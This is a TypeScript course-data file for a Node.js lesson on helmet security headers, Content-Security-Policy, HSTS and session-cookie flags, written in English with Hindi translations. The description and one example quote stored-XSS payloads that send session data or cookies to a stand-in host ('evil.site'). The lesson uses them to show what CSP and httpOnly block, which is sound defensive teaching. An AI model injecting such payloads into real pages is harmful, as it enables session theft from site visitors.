/**
 * Node.js Complete Course — Module 10: Hardening & Test Strategy, lesson 1.
 *
 * Security headers and cookie hardening: what helmet sets and why, Content-
 * Security-Policy (the one header worth tuning by hand), HSTS, X-Content-Type-
 * Options, Referrer-Policy, X-Frame-Options / frame-ancestors, removing
 * X-Powered-By; and the cookie flags that actually protect a session —
 * httpOnly, Secure, SameSite, the __Host- prefix, Path/Domain scoping,
 * signed cookies, and short lifetimes.
 *
 * Header/cookie values in the `output` blocks are the actual strings emitted
 * by helmet / express defaults (Node course convention: prose-described).
 */

import type { CourseLesson } from './course-js-module1';

export const NODE_MODULE_10: CourseLesson[] = [
  {
    slug: 'security-headers-and-cookie-hardening',
    title: 'Security Headers & Cookie Hardening',
    titleHi: 'Security Headers Aur Cookie Hardening',
    description: 'A single stored comment containing `<script>fetch("/api/me").then(r=>r.json()).then(d=>navigator.sendBeacon("//evil.site",JSON.stringify(d)))</script>` runs in every visitor\'s browser and exfiltrates their session — because there is no Content-Security-Policy and the session cookie is readable from JavaScript.',
    descriptionHi: 'Ek single stored comment jismein `<script>...</script>` hai har visitor ke browser mein chalta hai aur unka session exfiltrate karta hai — kyunki koi Content-Security-Policy nahi hai aur session cookie JavaScript se readable hai.',
    difficulty: 'MEDIUM',
    duration: 22,
    order: 1,

    analogy: {
      en: '**The building-security layer of a bank branch, versus the vault.** The vault — your authentication, your authorization checks, your input validation — is the thing that actually protects the money, and if it fails nothing else saves you. But a bank does not stop there. It bolts the front doors so they cannot be propped open (`Strict-Transport-Security` — never downgrade to an unlocked HTTP connection). It refuses to let its lobby be filmed and rebroadcast as if it were a different bank\'s lobby (`X-Frame-Options` / `frame-ancestors` — no clickjacking your page inside an attacker\'s iframe). It has a strict rule about which contractors\' vans are allowed into the loading bay and what they may unload (`Content-Security-Policy` — the browser only runs scripts from sources you named). It tells couriers not to write the full account number on the outside of the envelope (`Referrer-Policy` — do not leak the current URL to third parties). And the keys themselves are on tamper-evident fobs that a customer physically cannot copy or read (`httpOnly` cookies — JavaScript, including injected JavaScript, cannot touch the session). Each control is cheap, none of them replaces the vault, and every real breach report is a list of the ones that were missing.',
      hi: '**Ek bank branch ki building-security layer, versus vault.** Vault — aapka authentication, authorization checks, input validation — wo cheez hai jo asal mein paisa protect karti hai, aur agar wo fail ho to kuch aur aapko nahi bachaata. Par ek bank wahaan nahi rukta. Ye front doors bolt karta hai taaki wo khuli na rahein (`Strict-Transport-Security`). Ye apni lobby ko film karke ek alag bank ki lobby ki tarah rebroadcast karne se mana karta hai (`X-Frame-Options` / `frame-ancestors`). Iska ek strict rule hai ki kaunse contractors ki vans loading bay mein allowed hain aur wo kya unload kar sakti hain (`Content-Security-Policy`). Ye couriers ko poora account number envelope ke bahar likhne se mana karta hai (`Referrer-Policy`). Aur keys khud tamper-evident fobs par hain jise ek customer physically copy ya padh nahi sakta (`httpOnly` cookies). Har control sasta hai, koi bhi vault ko replace nahi karta, aur har real breach report un ki ek list hai jo missing the.',
    },

    simple: `**\`helmet\` — one middleware, a stack of safe defaults**

\`\`\`js
import helmet from "helmet";
app.use(helmet());   // put it FIRST, before routes
\`\`\`

\`helmet()\` sets (among others):

\`\`\`
Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:; ...
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Referrer-Policy: no-referrer
Cross-Origin-Opener-Policy: same-origin
X-DNS-Prefetch-Control: off
Origin-Agent-Cluster: ?1
...and REMOVES  X-Powered-By: Express
\`\`\`

**Content-Security-Policy — the one to tune by hand**

\`\`\`js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'", "https://cdn.example.com"],   // ONLY these origins may run scripts
    styleSrc:   ["'self'", "'unsafe-inline'"],            // inline styles allowed (still no inline <script>)
    imgSrc:     ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],    // fetch/XHR/WebSocket targets
    frameAncestors: ["'none'"],                            // modern clickjacking defense
    objectSrc:  ["'none'"],
    upgradeInsecureRequests: [],
  },
}));
// with this, an injected <script> tag with inline JS simply does not execute
\`\`\`

**The key headers, one line each**

\`\`\`
Content-Security-Policy      what the browser may load/run — the strongest XSS mitigation
Strict-Transport-Security    "only ever talk to me over HTTPS" — set once you are HTTPS-only
X-Content-Type-Options       nosniff — stop the browser guessing a .txt is really HTML/JS
X-Frame-Options / CSP        SAMEORIGIN / frame-ancestors 'none' — no framing = no clickjacking
Referrer-Policy              limit how much of the URL leaks to other sites
Permissions-Policy           turn off camera/mic/geolocation you never use
\`\`\`

**Session cookie flags — the ones that matter**

\`\`\`js
res.cookie("sid", token, {
  httpOnly: true,      // JS cannot read it -> an XSS payload cannot steal the session
  secure: true,        // only sent over HTTPS
  sameSite: "lax",     // not sent on cross-site POSTs -> CSRF mitigation ("strict" for admin)
  path: "/",
  maxAge: 1000 * 60 * 60 * 8,   // 8h — short; refresh on activity
  signed: true,        // tamper-evident (needs cookie-parser with a secret)
});
\`\`\`

**\`__Host-\` prefix — the browser enforces the hardening for you**

\`\`\`js
res.cookie("__Host-sid", token, { httpOnly: true, secure: true, sameSite: "lax", path: "/" });
// the browser REFUSES to store a __Host- cookie unless: Secure + Path=/ + no Domain attribute
\`\`\``,

    simpleHi: `**\`helmet\` — ek middleware, safe defaults ka ek stack**

\`\`\`js
import helmet from "helmet";
app.use(helmet());   // routes se PEHLE rakho
\`\`\`

\`helmet()\` set karta hai (kई ke beech):

\`\`\`
Content-Security-Policy: default-src 'self'; ...
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Referrer-Policy: no-referrer
...aur X-Powered-By: Express HATATA hai
\`\`\`

**Content-Security-Policy — haath se tune karne waala**

\`\`\`js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'", "https://cdn.example.com"],   // SIRF ye origins scripts chala sakte hain
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"],
    objectSrc:  ["'none'"],
  },
}));
// iske saath, inline JS waala ek injected <script> tag bस execute nahi hota
\`\`\`

**Key headers, ek line har ek**

\`\`\`
Content-Security-Policy      browser kya load/run kar sakta hai — sabse strong XSS mitigation
Strict-Transport-Security    "sirf hamesha HTTPS par baat karo" — HTTPS-only hone par set karo
X-Content-Type-Options       nosniff — browser ko guess karne se roko ki ek .txt asal mein HTML/JS hai
X-Frame-Options / CSP        SAMEORIGIN / frame-ancestors 'none' — koi framing nahi = koi clickjacking nahi
Referrer-Policy              URL ka kitna doosri sites mein leak ho ise limit karo
Permissions-Policy           camera/mic/geolocation off karo jo aap kabhi istemal nahi karte
\`\`\`

**Session cookie flags — jo maayne rakhte hain**

\`\`\`js
res.cookie("sid", token, {
  httpOnly: true,      // JS ise padh nahi sakta -> ek XSS payload session chura nahi sakta
  secure: true,        // sirf HTTPS par bheja
  sameSite: "lax",     // cross-site POSTs par nahi bheja -> CSRF mitigation
  path: "/",
  maxAge: 1000 * 60 * 60 * 8,   // 8h — chhota
  signed: true,        // tamper-evident
});
\`\`\`

**\`__Host-\` prefix — browser aapke liye hardening enforce karta hai**

\`\`\`js
res.cookie("__Host-sid", token, { httpOnly: true, secure: true, sameSite: "lax", path: "/" });
// browser ek __Host- cookie store karne se MANA karta hai jab tak: Secure + Path=/ + koi Domain attribute nahi
\`\`\``,

    content: `## Security headers are defence in depth

Headers do not replace authentication, authorization, or input validation — those are the actual protections. Headers make the *browser* enforce a second layer: even if an XSS payload lands, a strict Content-Security-Policy can stop it running; even if a link goes out over HTTP, HSTS forces HTTPS; even if your page is embeddable, \`frame-ancestors\` stops clickjacking. They are close to free to add and every incident post-mortem lists the ones that were missing.

## \`helmet\`

\`helmet\` is a collection of small middlewares that set (or remove) security-relevant headers. \`app.use(helmet())\` — placed **before your routes** — turns on a sane default set:

- **\`Content-Security-Policy\`** — a restrictive default (\`default-src 'self'\`); you almost always need to customise \`scriptSrc\` / \`connectSrc\` / \`imgSrc\`.
- **\`Strict-Transport-Security: max-age=31536000; includeSubDomains\`** — tells browsers to use HTTPS for this host for a year. Only enable once every subdomain is HTTPS; add \`preload\` and submit to the HSTS preload list only when you are certain.
- **\`X-Content-Type-Options: nosniff\`** — stops the browser from second-guessing a response's declared \`Content-Type\` (which is how a user-uploaded "image" that is actually HTML+JS gets executed).
- **\`X-Frame-Options: SAMEORIGIN\`** — legacy anti-framing; the modern equivalent is CSP \`frame-ancestors\`.
- **\`Referrer-Policy: no-referrer\`** (helmet's default) — do not send the \`Referer\` header at all. Many apps prefer \`strict-origin-when-cross-origin\` (send the origin, not the path, to other sites).
- **\`Cross-Origin-Opener-Policy: same-origin\`**, **\`Cross-Origin-Resource-Policy\`**, **\`Origin-Agent-Cluster\`** — process-isolation headers that mitigate Spectre-class attacks.
- **Removes \`X-Powered-By: Express\`** — a small reduction in free reconnaissance.

\`helmet()\` does **not** set CORS (that is \`cors\`, Module 4), does not set cookies, and does not do rate limiting.

## Content-Security-Policy in depth

CSP is a header of **directives**, each naming allowed sources for one resource type. The browser refuses to load or execute anything not on the list, and reports violations.

\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com wss://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
\`\`\`

Points that trip people up:

- **\`'self'\` is the page's own origin** (scheme + host + port), not "same site".
- **No source list allows inline code.** \`<script>doThing()</script>\` and \`onclick="..."\` attributes are blocked unless you add \`'unsafe-inline'\` (which defeats most of CSP's XSS value) or use a **nonce** / **hash**. A per-response nonce (\`script-src 'nonce-<random>'\`, and \`<script nonce="<random>">\`) is the right way to allow specific inline scripts.
- **\`connect-src\`** governs \`fetch\`, \`XMLHttpRequest\`, \`WebSocket\`, \`EventSource\`, and \`navigator.sendBeacon\` — this is what stops an injected script from *exfiltrating* data to an attacker's server even if it somehow runs.
- **\`frame-ancestors\`** is the real clickjacking control (who may embed *you*); \`frame-src\` / \`child-src\` control who *you* may embed.
- Roll out with **\`Content-Security-Policy-Report-Only\`** plus a \`report-to\` / \`report-uri\` endpoint first — collect violations for a week, fix the legitimate ones, then enforce.

## The other headers, briefly

- **\`Permissions-Policy\`** — \`camera=(), microphone=(), geolocation=()\` disables browser features your app never uses, so a compromised script cannot use them either.
- **\`Cache-Control: no-store\`** on authenticated JSON responses — keeps a user's data out of a shared proxy or the browser's disk cache.
- **Do not send \`Server\` version strings** or verbose \`X-\* \` debugging headers in production.

## Cookie hardening

A session cookie is a bearer credential. The flags decide how exposed it is.

- **\`httpOnly: true\`** — the cookie is not in \`document.cookie\`, so JavaScript (including an injected XSS payload) cannot read it. This is the single most important flag for a session cookie. A token you store in \`localStorage\` has *no* equivalent — any XSS reads it.
- **\`secure: true\`** — the cookie is only sent over HTTPS, so it cannot leak over a downgraded or intercepted HTTP request.
- **\`sameSite\`** — \`"strict"\` (never sent on any cross-site request — best for admin panels, but breaks inbound links from other sites), \`"lax"\` (sent on top-level GET navigations but not on cross-site POST/fetch — a good default and a solid CSRF mitigation), \`"none"\` (sent on all cross-site requests — requires \`secure\`, only for genuine cross-site cookies).
- **\`path\` / \`domain\`** — scope the cookie as narrowly as the app allows. Omit \`domain\` to bind it to the exact host (no subdomains).
- **\`maxAge\` / \`expires\`** — keep sessions short (hours, not weeks) and refresh on activity; pair a short session cookie with a separate, longer, more protected refresh mechanism if you need "remember me".
- **\`signed: true\`** (with \`cookie-parser\` and a secret) — appends an HMAC so the server detects tampering. Signing is *not* encryption — the value is still readable; it just cannot be forged.

## Cookie name prefixes

The browser enforces rules based on the cookie *name*:

- **\`__Host-\`** — the browser will only store it if it has \`Secure\`, \`Path=/\`, and **no \`Domain\` attribute**. This guarantees the cookie is host-locked and HTTPS-only, and a subdomain cannot set or overwrite it. Use this for session cookies.
- **\`__Secure-\`** — weaker: requires \`Secure\` and an HTTPS origin, but allows \`Domain\` and other paths.

Naming a cookie \`__Host-session\` makes the browser reject any attempt to set it without the hardening, which also protects against a compromised subdomain injecting a forged session cookie (session fixation).

## A minimal hardened setup

\`\`\`js
app.disable("x-powered-by");
app.use(helmet({
  contentSecurityPolicy: { directives: { /* your tuned directives */ } },
  strictTransportSecurity: { maxAge: 31536000, includeSubDomains: true, preload: false },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
}));
app.use(cookieParser(process.env.COOKIE_SECRET));
// on login:
res.cookie("__Host-sid", sessionId, {
  httpOnly: true, secure: true, sameSite: "lax", path: "/", maxAge: 8 * 3600_000, signed: true,
});
\`\`\``,

    contentHi: `## Security headers defence in depth hain

Headers authentication, authorization, ya input validation ko replace nahi karte — wo asli protections hain. Headers *browser* ko ek doosri layer enforce karvaate hain: agar ek XSS payload land bhi ho, ek strict Content-Security-Policy ise chalne se rok sakti hai; agar ek link HTTP par jaaye bhi, HSTS HTTPS force karta hai; agar aapka page embeddable ho bhi, \`frame-ancestors\` clickjacking rokta hai.

## \`helmet\`

\`helmet\` chhote middlewares ka ek collection hai jo security-relevant headers set (ya remove) karte hain. \`app.use(helmet())\` — **routes se pehle** — ek sane default set on karta hai:

- **\`Content-Security-Policy\`** — ek restrictive default; aap lagbhag hamesha \`scriptSrc\` / \`connectSrc\` customise karte ho.
- **\`Strict-Transport-Security\`** — browsers ko is host ke liye ek saal HTTPS istemal karne ko kehta hai. Sirf tab enable karo jab har subdomain HTTPS ho.
- **\`X-Content-Type-Options: nosniff\`** — browser ko ek response ka declared \`Content-Type\` second-guess karne se rokta hai.
- **\`X-Frame-Options: SAMEORIGIN\`** — legacy anti-framing; modern samतुल्य CSP \`frame-ancestors\` hai.
- **\`X-Powered-By: Express\` HATATA hai.**

\`helmet()\` CORS set **nahi** karta, cookies set nahi karta, rate limiting nahi karta.

## Content-Security-Policy detail mein

CSP **directives** ka ek header hai, har ek ek resource type ke liye allowed sources naam karti hai. Browser list par na hone waali kisi bhi cheez ko load ya execute karne se mana karta hai.

Points jo log par trip karte hain:
- **\`'self'\` page ka apna origin hai** (scheme + host + port), "same site" nahi.
- **Koi source list inline code allow nahi karti.** \`<script>doThing()</script>\` block hoti hai jab tak aap \`'unsafe-inline'\` add na karo (jo CSP ke zyaadatar XSS value ko defeat karta hai) ya ek **nonce** / **hash** istemal karo.
- **\`connect-src\`** \`fetch\`, \`XMLHttpRequest\`, \`WebSocket\`, \`navigator.sendBeacon\` ko govern karta hai — yahi ek injected script ko data *exfiltrate* karne se rokta hai.
- **\`frame-ancestors\`** asli clickjacking control hai (kaun *aapko* embed kar sakta hai).
- Pehle **\`Content-Security-Policy-Report-Only\`** ke saath roll out karo — ek hafte violations collect karo, legitimate ones fix karo, phir enforce karo.

## Cookie hardening

Ek session cookie ek bearer credential hai. Flags decide karte hain ye kitna exposed hai.

- **\`httpOnly: true\`** — cookie \`document.cookie\` mein nahi hai, to JavaScript (ek injected XSS payload samet) ise padh nahi sakta. Ye ek session cookie ke liye sabse mahatvapoorna flag hai. \`localStorage\` mein store kiya ek token ka *koi* samतुल्य nahi hai — koi bhi XSS ise padhta hai.
- **\`secure: true\`** — cookie sirf HTTPS par bheji jaati hai.
- **\`sameSite\`** — \`"strict"\` (kisi bhi cross-site request par kabhi nahi bheji — admin panels ke liye best), \`"lax"\` (top-level GET navigations par bheji par cross-site POST/fetch par nahi — ek achha default aur solid CSRF mitigation), \`"none"\` (sab cross-site requests par bheji — \`secure\` chahiye).
- **\`maxAge\`** — sessions chhote rakho (ghante, hafte nahi).
- **\`signed: true\`** — ek HMAC append karta hai taaki server tampering detect kare. Signing encryption *nahi* hai.

## Cookie name prefixes

Browser cookie *name* ke aadhaar par rules enforce karta hai:
- **\`__Host-\`** — browser ise sirf tab store karega agar iske paas \`Secure\`, \`Path=/\`, aur **koi \`Domain\` attribute nahi** ho. Session cookies ke liye ise istemal karo.
- **\`__Secure-\`** — weaker: \`Secure\` aur ek HTTPS origin chahiye.

Ek cookie ko \`__Host-session\` naam dena browser ko hardening ke bina ise set karne ki kisi bhi koshish ko reject karvaata hai, jo ek compromised subdomain ko ek forged session cookie inject karne se bhi bachaata hai.`,

    examples: [
      {
        title: 'What helmet() actually adds and removes',
        titleHi: 'helmet() asal mein kya add aur remove karta hai',
        code: `import express from "express";
import helmet from "helmet";

const app = express();
app.use(helmet());
app.get("/", (req, res) => res.send("ok"));

// curl -sI http://localhost:3000/  shows the response headers helmet set`,
        codeJs: `import express from "express";
import helmet from "helmet";

const app = express();
app.use(helmet());                          // BEFORE routes
app.get("/", (_req, res) => res.send("ok"));
app.listen(3000);

/* Response headers now include (curl -sI):

   Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;
     form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';
     script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
   Cross-Origin-Opener-Policy: same-origin
   Cross-Origin-Resource-Policy: same-origin
   Origin-Agent-Cluster: ?1
   Referrer-Policy: no-referrer
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   X-Content-Type-Options: nosniff
   X-DNS-Prefetch-Control: off
   X-Download-Options: noopen
   X-Frame-Options: SAMEORIGIN
   X-Permitted-Cross-Domain-Policies: none
   X-XSS-Protection: 0

   And the header that is NO LONGER present:
   X-Powered-By: Express        <-- removed
*/`,
        codeTs: `import express, { type Request, type Response } from "express";
import helmet from "helmet";

const app = express();
app.use(helmet());
app.get("/", (_req: Request, res: Response) => res.send("ok"));
app.listen(3000);`,
        output: `helmet() adds ~13 headers including a restrictive Content-Security-Policy,
Strict-Transport-Security (1 year), X-Content-Type-Options: nosniff,
X-Frame-Options: SAMEORIGIN, Referrer-Policy: no-referrer, and the
Cross-Origin-* isolation headers — and it deletes X-Powered-By: Express.

Note X-XSS-Protection is deliberately set to 0: the legacy browser XSS
auditor caused bugs and is disabled in favour of CSP.`,
        explain: 'helmet() is a bundle of small header-setting middlewares with safe defaults. One app.use, placed before the routes, gives you a strict-ish CSP, HSTS, nosniff, anti-framing, a conservative Referrer-Policy, the cross-origin isolation headers, and removal of the X-Powered-By fingerprint. It does not do CORS, cookies, or rate limiting. The default CSP is a starting point — you will almost always need to widen script-src and connect-src for your CDN and API.',
        explainHi: 'helmet() safe defaults ke saath chhote header-setting middlewares ka ek bundle hai. Ek app.use, routes se pehle, aapko ek strict-ish CSP, HSTS, nosniff, anti-framing, ek conservative Referrer-Policy, cross-origin isolation headers, aur X-Powered-By fingerprint ka removal deta hai. Ye CORS, cookies, ya rate limiting nahi karta.',
      },
      {
        title: 'A tuned CSP blocks an injected inline script from running',
        titleHi: 'Ek tuned CSP ek injected inline script ko chalne se rokta hai',
        code: `app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],                 // no 'unsafe-inline', no external origins
    connectSrc: ["'self'"],                 // fetch/XHR/beacon may only hit our own origin
    frameAncestors: ["'none'"],
    objectSrc: ["'none'"],
  },
}));

// page renders a stored comment containing:
//   <script>navigator.sendBeacon("//evil.site", document.cookie)</script>`,
        codeJs: `import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],       // inline <script> and on* attributes are blocked
      connectSrc: ["'self'"],      // sendBeacon / fetch to other origins is blocked
      imgSrc: ["'self'", "data:"],
      frameAncestors: ["'none'"],  // your page cannot be iframed anywhere
      objectSrc: ["'none'"],       // no <object>/<embed>/<applet>
      baseUri: ["'self'"],         // attacker cannot repoint relative URLs with <base>
    },
  }),
);

/* An injected comment body like:
     <script>navigator.sendBeacon("//evil.site", document.cookie)</script>

   With this CSP, the browser:
   1. refuses to execute the inline <script>  (script-src 'self' has no 'unsafe-inline')
   2. even a loaded script calling fetch("//evil.site")  -> blocked by connect-src 'self'
   3. logs a "Refused to execute inline script" console error / CSP report

   Combined with an httpOnly session cookie, document.cookie would not
   contain the session id anyway — two layers, both needed.
*/`,
        codeTs: `import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    } as Record<string, string[]>,
  }),
);`,
        output: `Browser console:
  Refused to execute inline script because it violates the following
  Content Security Policy directive: "script-src 'self'". Either the
  'unsafe-inline' keyword, a hash, or a nonce is required to enable
  inline execution.

  Refused to connect to '//evil.site/' because it violates the document's
  Content Security Policy.

The injected <script> never ran, and even if a permitted script were
compromised, connect-src 'self' blocks exfiltration to evil.site.`,
        explain: 'A CSP with script-src set to only \'self\' (no \'unsafe-inline\') means the browser will not execute any inline <script> tag or inline event handler — which is exactly how most reflected and stored XSS payloads try to run. connect-src \'self\' then blocks any script that does run from sending data to an external origin via fetch, XHR, WebSocket, or sendBeacon. CSP does not fix the injection itself — you still must escape output — but it turns a working exploit into a blocked one, which is why it is the strongest single XSS mitigation.',
        explainHi: 'Ek CSP jismein script-src sirf \'self\' set hai (koi \'unsafe-inline\' nahi) ka matlab browser kisi bhi inline <script> tag ya inline event handler ko execute nahi karega — jo theek wahi hai jaise zyaadatar reflected aur stored XSS payloads chalne ki koshish karte hain. connect-src \'self\' phir kisi bhi script jo chalti hai use ek external origin ko data bhejne se rokta hai. CSP injection khud ko fix nahi karta — aapko abhi bhi output escape karna hoga — par ye ek working exploit ko ek blocked one mein badal deta hai.',
      },
      {
        title: '__Host- cookie: the browser rejects it without the hardening',
        titleHi: '__Host- cookie: browser ise hardening ke bina reject karta hai',
        code: `// GOOD: satisfies every __Host- requirement -> stored
res.cookie("__Host-sid", token, {
  httpOnly: true, secure: true, sameSite: "lax", path: "/",   // Secure + Path=/ + no domain
});

// BAD: has a domain attribute -> browser silently drops it
res.cookie("__Host-sid", token, {
  httpOnly: true, secure: true, sameSite: "lax", path: "/", domain: "example.com",
});`,
        codeJs: `import cookieParser from "cookie-parser";
app.use(cookieParser(process.env.COOKIE_SECRET));

app.post("/login", (req, res) => {
  const token = createSession(req.body);

  // The __Host- prefix is a CONTRACT the browser enforces:
  //   must have Secure
  //   must have Path=/
  //   must NOT have a Domain attribute  (so it is locked to the exact host)
  res.cookie("__Host-sid", token, {
    httpOnly: true,     // not readable by JS
    secure: true,       // required by __Host-
    sameSite: "lax",    // CSRF mitigation
    path: "/",          // required by __Host-
    // NO domain: — required by __Host-
    maxAge: 8 * 60 * 60 * 1000,
    signed: true,       // HMAC so tampering is detected server-side
  });
  res.json({ ok: true });
});

// If any of Secure / Path=/ / (no Domain) is missing, Set-Cookie is sent
// but the browser DISCARDS it — the user appears logged out. This failure
// is loud in testing and prevents a weakly-scoped session cookie shipping.`,
        codeTs: `import cookieParser from "cookie-parser";
import type { Request, Response } from "express";

app.use(cookieParser(process.env.COOKIE_SECRET));

app.post("/login", (req: Request, res: Response) => {
  const token = createSession(req.body);
  res.cookie("__Host-sid", token, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    path: "/",
    maxAge: 8 * 60 * 60 * 1000,
    signed: true,
  });
  res.json({ ok: true });
});`,
        output: `GOOD cookie:  stored. Subsequent requests send
  Cookie: __Host-sid=s%3A<token>.<hmac>

BAD cookie (with domain=example.com):  the Set-Cookie header goes out,
but the browser refuses to store any __Host-prefixed cookie that carries
a Domain attribute. The next request has no cookie -> the user is not
logged in. The __Host- prefix makes a mis-scoped session cookie fail
visibly instead of shipping quietly.`,
        explain: 'The __Host- name prefix is a signal to the browser to enforce three properties: the cookie must be Secure, must have Path=/, and must have no Domain attribute — which together guarantee it is HTTPS-only and locked to the exact host, so a sibling or compromised subdomain cannot read or overwrite it (session fixation defence). If your cookie options do not satisfy all three, the browser drops the cookie entirely, which turns a security misconfiguration into an obvious "login is broken" bug you catch immediately.',
        explainHi: '__Host- name prefix browser ke liye teen properties enforce karne ka ek signal hai: cookie Secure honi chahiye, Path=/ honi chahiye, aur koi Domain attribute nahi hona chahiye — jo milkar guarantee karte hain ki ye HTTPS-only aur exact host se locked hai, to ek sibling ya compromised subdomain ise padh ya overwrite nahi kar sakta. Agar aapke cookie options teenon ko satisfy nahi karte, browser cookie ko poori tarah drop karta hai, jo ek security misconfiguration ko ek obvious "login broken" bug mein badal deta hai jise aap turant pakadte ho.',
      },
    ],

    mistakes: [
      {
        wrong: `// SPA stores the JWT where any script can read it
localStorage.setItem("token", res.data.accessToken);
// every fetch: headers: { Authorization: \`Bearer \${localStorage.token}\` }
// one XSS anywhere on the origin -> the token is exfiltrated in one line`,
        right: `// server sets an httpOnly cookie the browser attaches automatically
res.cookie("__Host-sid", sessionId, {
  httpOnly: true, secure: true, sameSite: "lax", path: "/", maxAge: 8 * 3600_000,
});
// the SPA makes credentialed requests (fetch(url, { credentials: "include" }))
// and never touches the token — an XSS payload cannot read an httpOnly cookie`,
        why: 'A token in localStorage or a non-httpOnly cookie is readable by any JavaScript running on the origin, which means any XSS — a vulnerable dependency, an unescaped field, a compromised third-party script — can read it and send it anywhere in a single line, and the stolen token is valid until it expires. An httpOnly cookie is not exposed to document.cookie at all, so the same XSS cannot steal the session. The tradeoff is that cookies are sent automatically and so need CSRF protection (SameSite=Lax plus, for state-changing requests, a CSRF token or an origin check), but that is a solved problem, whereas "XSS reads localStorage" has no mitigation.',
        whyHi: 'localStorage mein ya ek non-httpOnly cookie mein ek token origin par chalne waali kisi bhi JavaScript dwara readable hai, jiska matlab koi bhi XSS ise padh sakta hai aur ise ek single line mein kahin bhi bhej sakta hai. Ek httpOnly cookie document.cookie ko bilkul exposed nahi hai, to wahi XSS session chura nahi sakta. Tradeoff ye hai ki cookies automatically bheji jaati hain aur isliye CSRF protection chahiye (SameSite=Lax plus ek CSRF token), par wo ek solved problem hai.',
      },
      {
        wrong: `// "just make CSP work" — add 'unsafe-inline' to script-src
app.use(helmet.contentSecurityPolicy({
  directives: { scriptSrc: ["'self'", "'unsafe-inline'"] },
}));
// this allows every inline <script> and on* handler — most of CSP's XSS
// protection is now off, but the header is still there giving false comfort`,
        right: `// allow specific inline scripts with a per-response nonce
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  next();
});
app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => \`'nonce-\${res.locals.nonce}'\`],
  },
}));
// in the template: <script nonce="<%= nonce %>"> ... </script>
// only scripts carrying the current nonce run; injected ones do not`,
        why: "Adding 'unsafe-inline' to script-src tells the browser to run any inline script, which is exactly what an XSS payload is. The header is still present, so scans pass and the team believes CSP is protecting them, but the main thing CSP does — block inline execution — is disabled. If you genuinely have inline scripts you cannot move to files, use a nonce: generate a random value per response, put it in the CSP as 'nonce-XYZ', and add nonce=\"XYZ\" to your own <script> tags. An injected script has no way to know the current nonce, so it is blocked while yours run.",
        whyHi: "script-src mein 'unsafe-inline' add karna browser ko koi bhi inline script chalane ko kehta hai, jo theek wahi hai jaise ek XSS payload hai. Header abhi bhi present hai, to scans pass hote hain aur team maanti hai ki CSP unhe protect kar raha hai, par CSP jo mukhya cheez karta hai — inline execution block — disabled hai. Agar aapke paas genuinely inline scripts hain, ek nonce istemal karo: prati response ek random value generate karo, ise CSP mein daalo, aur apne <script> tags mein nonce jodo.",
      },
      {
        wrong: `app.use(helmet());   // sets HSTS with max-age 31536000 immediately
// ...but api.internal.example.com is still HTTP-only, and now every browser
// that hit the main site refuses to load it over HTTP for a YEAR`,
        right: `// enable HSTS only when EVERY host under the domain is HTTPS,
// and ramp the max-age:
app.use(helmet({
  strictTransportSecurity: process.env.NODE_ENV === "production"
    ? { maxAge: 300, includeSubDomains: false }   // start tiny, no subdomains
    : false,
}));
// widen to a year + includeSubDomains + preload only after verifying
// every subdomain serves HTTPS and you are committed to it permanently`,
        why: 'Strict-Transport-Security with includeSubDomains tells every browser that saw the header to refuse plain HTTP to your domain and all its subdomains for the full max-age — a year by default. If any subdomain (an internal API, a legacy service, a vendor tool on a subdomain) is still HTTP-only, you have just broken it for every user, and you cannot undo it quickly because browsers cache the policy. Roll HSTS out deliberately: confirm every host is HTTPS, start with a short max-age without includeSubDomains, watch for breakage, then ramp up. Only submit to the preload list when you are certain, because removal from preload takes months.',
        whyHi: 'includeSubDomains ke saath Strict-Transport-Security har browser ko jisne header dekha aapke domain aur iske sabhi subdomains ko plain HTTP mana karne ko kehta hai poore max-age ke liye — default se ek saal. Agar koi subdomain abhi bhi HTTP-only hai, aapne ise har user ke liye tod diya hai, aur aap ise jaldi undo nahi kar sakte kyunki browsers policy cache karte hain. HSTS ko jaan-boojhkar roll out karo: confirm karo har host HTTPS hai, ek chhote max-age se shuru karo bina includeSubDomains, phir ramp up karo.',
      },
    ],

    realWorld: [
      {
        en: '**`helmet()` first in the middleware stack, a hand-tuned CSP with a per-request nonce for the two inline bootstrap scripts, and `Content-Security-Policy-Report-Only` shipped for two weeks first** — the report endpoint surfaced a forgotten analytics domain before enforcement broke it.',
        hi: '**Middleware stack mein `helmet()` pehle, do inline bootstrap scripts ke liye ek per-request nonce waali hand-tuned CSP, aur pehle do hafte `Content-Security-Policy-Report-Only`**.',
      },
      {
        en: '**Session in a `__Host-sid` httpOnly + Secure + SameSite=Lax cookie, 8-hour lifetime, signed**, with the SPA calling `fetch(url, { credentials: "include" })` and a CSRF token on state-changing routes — the frontend never sees or stores a token.',
